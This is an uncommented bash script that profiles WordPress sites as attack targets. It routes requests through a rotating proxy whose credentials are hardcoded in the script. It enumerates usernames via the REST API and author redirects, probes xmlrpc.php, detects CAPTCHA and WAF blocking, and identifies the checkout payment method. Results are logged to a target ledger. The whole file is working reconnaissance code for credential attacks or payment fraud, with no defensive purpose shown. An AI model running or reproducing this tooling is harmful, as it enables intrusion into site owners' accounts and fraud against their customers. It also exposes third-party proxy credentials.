#!/bin/bash
cd /work
export https_proxy=http://nwxgczwm-jp-rotate:8yma8sifzpty@p.webshare.io:80
P=http://127.0.0.1:3128
H=$1
E=$(curl -s -o /dev/null -w "%{redirect_url}" -m 20 -x $P "https://$H/wp-admin/")
LOGIN=$(echo "$E" | sed "s#.*//[^/]*##; s#?.*##")
if [ -z "$LOGIN" ]; then LOGIN=/wp-login.php; fi
A=$(curl -s -o /dev/null -w "%{http_code}" -m 20 -x $P "https://$H$LOGIN")
U=$(curl -s -o /dev/null -w "%{http_code}" -m 20 -x $P "https://$H/wp-json/wp/v2/users")
SRC=users
IDS=$(curl -s -m 20 -x $P "https://$H/wp-json/wp/v2/users?per_page=30" | grep -o "\"slug\":\"[^\"]*\"" | cut -d\" -f4 | tr "\n" ",")
if [ -z "$IDS" ]; then
  SRC=author
  for i in 1 2 3; do
    S=$(curl -s -o /dev/null -w "%{redirect_url}" -m 20 -x $P "https://$H/?author=$i")
    case "$S" in */author/*) IDS="$IDS$(echo $S | sed "s#.*/author/##; s#/.*##"),";; esac
  done
fi
if [ -z "$IDS" ]; then SRC=none; fi
XR=$(curl -s -m 20 -x $P -X POST -d "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" "https://$H/xmlrpc.php" | head -c 60)
CAP=$(curl -s -m 20 -x $P "https://$H$LOGIN" | grep -c -iE "siteguard|recaptcha|turnstile|hcaptcha")
CK=$(curl -s -m 20 -x $P "https://$H/checkout/")
PAYT=none
case "$CK" in *bankjp*|*bacs*|*postofficebank*) PAYT=bacs;; *) case "$CK" in *stripe*) PAYT=stripe;; esac;; esac
V=UNKNOWN
R=""
if [ "$A" = "000" ]; then if [ "$U" = "000" ]; then V=DEAD; R=DEAD_DOMAIN; fi; fi
if [ "$A" = "403" ]; then R="$R WAF"; fi
if [ "$A" = "404" ]; then R="$R ENTRY404"; fi
case "$XR" in *methodResponse*) R="$R XROK";; *) R="$R XRDEAD";; esac
if [ "$CAP" -gt 0 ]; then R="$R CAPTCHA"; fi
if [ "$PAYT" = "none" ]; then R="$R NO_PAY"; fi
if [ "$U" = "200" ]; then if [ "$A" = "200" ]; then V=REAL; fi; fi
if [ "$U" != "200" ]; then if [ "$A" != "200" ]; then if [ "$V" != "DEAD" ]; then R="$R NOID"; fi; fi; fi
R=$(echo $R | tr -s " ")
N=$(echo "$IDS" | tr "," "\n" | grep -c .)
printf "%s %s %s %s %s 0 PARK %s %s - -" "ENTRY" "$H" "$LOGIN" "$SRC" "$N" "$R" "$PAYT" >> /work/ev/led/ledger2.tsv
printf "\n" >> /work/ev/led/ledger2.tsv
echo "$H $V pay=$PAYT login=$A users=$U cap=$CAP xr=${XR:0:20} src=$SRC ids=$IDS"
